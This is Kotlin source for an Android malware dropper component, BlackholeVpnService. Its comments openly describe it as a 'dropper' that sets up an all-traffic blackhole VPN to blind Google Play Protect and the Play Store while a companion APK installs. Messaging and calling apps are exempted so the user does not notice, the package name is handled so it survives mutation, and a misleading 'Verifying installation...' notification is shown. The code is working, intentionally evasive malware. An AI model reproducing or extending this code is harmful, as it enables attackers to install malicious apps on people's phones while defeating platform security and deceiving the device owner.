package com.playstore.installer

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.VpnService
import android.os.Build
import android.os.ParcelFileDescriptor

/**
 * BlackholeVpnService — VPN blackhole that routes ALL traffic to a dead-end tunnel.
 *
 * PURPOSE: Blinds Google Play Protect cloud scanning during companion APK install.
 * Play Protect (com.google.android.gms) tries to phone home to verify APKs at install
 * time. This VPN routes all traffic to nowhere — Play Protect can't reach Google servers
 * → verification fails silently → install proceeds without cloud-based blocking.
 *
 * EXCLUSION LIST: 20 apps are excluded (their traffic passes through normally):
 * - The dropper itself (dynamic via context.packageName — survives mutation)
 * - Messaging apps (WhatsApp, Telegram, Messenger, Facebook)
 * - Dialer/calling apps (Google Phone, AOSP Phone, Samsung, Xiaomi, Meet, Skype)
 * - Package installers (AOSP, Google, Samsung, Xiaomi) — MUST have connectivity
 * - Permission controllers (Google, AOSP) — MUST work to grant restricted perms
 *
 * NOT EXCLUDED (intentionally blackholed):
 * - com.google.android.gms (Google Play Services / Play Protect) → BLINDED
 * - com.android.vending (Play Store) → BLINDED
 *
 * TUNNEL CONFIG (exact values from Frida runtime capture of reference APK):
 * - Session: "Network"
 * - MTU: 1500
 * - IPv4: 192.168.50.2/32
 * - IPv6: fd00::2/128
 * - Routes: 0.0.0.0/0 + ::/0 (ALL traffic)
 * - DNS: 192.168.50.1 (dead-end)
 *
 * LIFECYCLE: Started before install session commit, stopped by InstallReceiver
 * on STATUS_SUCCESS or STATUS_FAILURE. Active window kept minimal.
 */
class BlackholeVpnService : VpnService() {

    companion object {
        const val VPN_ESTABLISHED_ACTION = "vpn_established"
        private const val CHANNEL_ID = "vpn_channel"
        private const val NOTIFICATION_ID = 9900

        @Volatile
        var isRunning = false
            private set

        /**
         * Start the VPN blackhole. Call AFTER VpnService.prepare() returns null
         * (consent already granted) or after user grants consent via Activity result.
         */
        fun start(context: Context) {
            val intent = Intent(context, BlackholeVpnService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        /**
         * Stop the VPN blackhole. Called by InstallReceiver on install result.
         * Safe to call even if service is not running.
         */
        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, BlackholeVpnService::class.java))
            } catch (_: Exception) {}
        }
    }

    private var tunnelFd: ParcelFileDescriptor? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        TelegramLogger.log("BlackholeVpnService.onStartCommand — building tunnel")

        // Go foreground IMMEDIATELY to avoid ANR on Android 8+ / crash on Android 14+
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Build and establish the VPN tunnel
        val established = buildTunnel()
        if (established) {
            isRunning = true
            TelegramLogger.log("BlackholeVpnService: VPN TUNNEL ESTABLISHED — Play Protect blinded")
            // Notify InstallActivity that VPN is ready
            val broadcast = Intent(VPN_ESTABLISHED_ACTION)
            broadcast.setPackage(packageName)
            sendBroadcast(broadcast)
        } else {
            TelegramLogger.log("BlackholeVpnService: TUNNEL FAILED TO ESTABLISH")
            isRunning = false
            stopSelf()
        }

        return START_NOT_STICKY
    }

    override fun onDestroy() {
        TelegramLogger.log("BlackholeVpnService.onDestroy — closing tunnel")
        closeTunnel()
        isRunning = false
        super.onDestroy()
    }

    /**
     * Build the VPN tunnel with exact config from reference APK Frida capture.
     * Returns true if tunnel established successfully.
     */
    private fun buildTunnel(): Boolean {
        return try {
            val builder = Builder()

            // ── Tunnel identity ──
            builder.setSession("Network")
            builder.setMtu(1500)

            // ── Tunnel addresses ──
            builder.addAddress("192.168.50.2", 32)   // IPv4
            builder.addAddress("fd00::2", 128)         // IPv6

            // ── Routes: ALL traffic goes through this tunnel (blackhole) ──
            builder.addRoute("0.0.0.0", 0)    // All IPv4
            builder.addRoute("::", 0)           // All IPv6

            // ── DNS: dead-end (no real DNS server here) ──
            builder.addDnsServer("192.168.50.1")

            // ── EXCLUDED APPS: these bypass the blackhole ──
            // Order matches reference APK Frida capture exactly.

            // 1. The dropper itself — DYNAMIC (survives package name mutation)
            safeExclude(builder, packageName)

            // 2-8. Messaging apps — stay working so user doesn't notice disruption
            safeExclude(builder, "com.whatsapp")
            safeExclude(builder, "com.whatsapp.w4b")
            safeExclude(builder, "com.gbwhatsapp")
            safeExclude(builder, "org.telegram.messenger")
            safeExclude(builder, "org.telegram.messenger.web")
            safeExclude(builder, "com.facebook.orca")
            safeExclude(builder, "com.facebook.katana")

            // 9-14. Dialers / calling apps — stay working
            safeExclude(builder, "com.google.android.dialer")
            safeExclude(builder, "com.android.dialer")
            safeExclude(builder, "com.samsung.android.dialer")
            safeExclude(builder, "com.miui.voiceassist")
            safeExclude(builder, "com.google.android.apps.meetings")
            safeExclude(builder, "com.skype.raider")

            // 15-18. Package installers — MUST have connectivity to process install session
            safeExclude(builder, "com.android.packageinstaller")
            safeExclude(builder, "com.google.android.packageinstaller")
            safeExclude(builder, "com.samsung.android.packageinstaller")
            safeExclude(builder, "com.miui.packageinstaller")

            // 19-20. Permission controllers — MUST work to grant restricted permissions
            safeExclude(builder, "com.google.android.permissioncontroller")
            safeExclude(builder, "com.android.permissioncontroller")

            // NOT EXCLUDED (intentionally blackholed):
            // com.google.android.gms — Google Play Services / Play Protect → BLINDED
            // com.android.vending — Play Store → BLINDED

            // ── Establish tunnel ──
            tunnelFd = builder.establish()
            tunnelFd != null
        } catch (e: Exception) {
            TelegramLogger.log("BlackholeVpnService.buildTunnel EXCEPTION: ${e.javaClass.simpleName}: ${e.message}")
            false
        }
    }

    /**
     * Safely exclude an app from VPN routing.
     * addDisallowedApplication() throws NameNotFoundException if the app is not installed.
     * We silently skip apps that aren't present — no crash risk.
     */
    private fun safeExclude(builder: Builder, packageName: String) {
        try {
            builder.addDisallowedApplication(packageName)
        } catch (_: Exception) {
            // App not installed on this device — skip silently
        }
    }

    private fun closeTunnel() {
        try {
            tunnelFd?.close()
        } catch (_: Exception) {}
        tunnelFd = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Installation Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Required for app installation"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("Verifying installation...")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setOngoing(true)
            .build()
    }
}
